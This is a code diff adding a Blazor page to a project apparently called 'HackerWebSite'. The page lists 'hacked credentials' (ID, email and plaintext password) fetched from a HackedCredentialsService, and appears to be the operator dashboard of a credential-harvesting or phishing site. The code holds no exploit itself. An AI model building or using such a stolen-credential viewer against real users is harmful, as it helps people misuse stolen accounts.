@@ -1,0 +1,44 @@
+﻿@page "/Hackedlogin_old"
+
+@using HackerWebSite.Data
+@inject HackedCredentialsService HackedCredentialsService
+
+<h2>Hacked Credentials</h2>
+
+<p>This component fetches data from HackedLogins.</p>
+
+@if (LoginDtoList == null)
+{
+    <p><em>Empty</em></p>
+}
+else
+{
+    <table class="table">
+        <thead>
+            <tr>
+                <th>S.No</th>
+                <th>Email</th>
+                <th>Password</th>
+            </tr>
+        </thead>
+        <tbody>
+            @foreach (var loginDto in LoginDtoList)
+            {
+                <tr>
+                    <td>@loginDto.Id</td>
+                    <td>@loginDto.Email</td>
+                    <td>@loginDto.Password</td>
+                </tr>
+            }
+        </tbody>
+    </table>
+}
+
+@code {
+    private List<LoginDTO> LoginDtoList;
+
+    protected override async Task OnInitializedAsync()
+    {
+        LoginDtoList = await HackedCredentialsService.GetLoginAsync();
+    }
+}
